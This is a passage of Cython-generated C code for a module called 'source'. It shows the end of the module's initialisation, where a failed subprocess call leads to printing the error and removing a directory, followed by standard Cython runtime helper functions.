      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 54, __pyx_L32_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    goto __pyx_L37_try_end;
    __pyx_L32_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __Pyx_ErrFetch(&__pyx_t_3, &__pyx_t_10, &__pyx_t_2);
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_subprocess); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 55, __pyx_L34_except_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_CalledProcessError); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 55, __pyx_L34_except_error)
    __Pyx_GOTREF(__pyx_t_12);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_13 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_3, __pyx_t_12);
    __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_ErrRestore(__pyx_t_3, __pyx_t_10, __pyx_t_2);
    __pyx_t_3 = 0; __pyx_t_10 = 0; __pyx_t_2 = 0;
    if (__pyx_t_13) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_10, &__pyx_t_3) < 0) __PYX_ERR(0, 55, __pyx_L34_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_e, __pyx_t_10) < 0) __PYX_ERR(0, 55, __pyx_L34_except_error)
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_e); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 56, __pyx_L43_error)
        __Pyx_GOTREF(__pyx_t_12);
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 56, __pyx_L43_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_shutil); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L43_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_rmtree); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 57, __pyx_L43_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L43_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 57, __pyx_L43_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 55, __pyx_L34_except_error) }
          goto __pyx_L44;
        }
        __pyx_L43_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_9 = 0; __pyx_t_11 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_18, &__pyx_t_19, &__pyx_t_20);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_9, &__pyx_t_11, &__pyx_t_17) < 0)) __Pyx_ErrFetch(&__pyx_t_9, &__pyx_t_11, &__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_9);
          __Pyx_XGOTREF(__pyx_t_11);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __Pyx_XGOTREF(__pyx_t_20);
          __pyx_t_13 = __pyx_lineno; __pyx_t_15 = __pyx_clineno; __pyx_t_16 = __pyx_filename;
          {
            if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_e) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 55, __pyx_L48_error) }
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_19, __pyx_t_20);
          }
          __Pyx_XGIVEREF(__pyx_t_9);
          __Pyx_XGIVEREF(__pyx_t_11);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_ErrRestore(__pyx_t_9, __pyx_t_11, __pyx_t_17);
          __pyx_t_9 = 0; __pyx_t_11 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
          __pyx_lineno = __pyx_t_13; __pyx_clineno = __pyx_t_15; __pyx_filename = __pyx_t_16;
          goto __pyx_L34_except_error;
          __pyx_L48_error:;
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_XGIVEREF(__pyx_t_20);
            __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_19, __pyx_t_20);
          }
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
          goto __pyx_L34_except_error;
        }
        __pyx_L44:;
      }
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L33_exception_handled;
    }
    goto __pyx_L34_except_error;
    __pyx_L34_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
    goto __pyx_L1_error;
    __pyx_L33_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
    __pyx_L37_try_end:;
  }

  
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_14);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
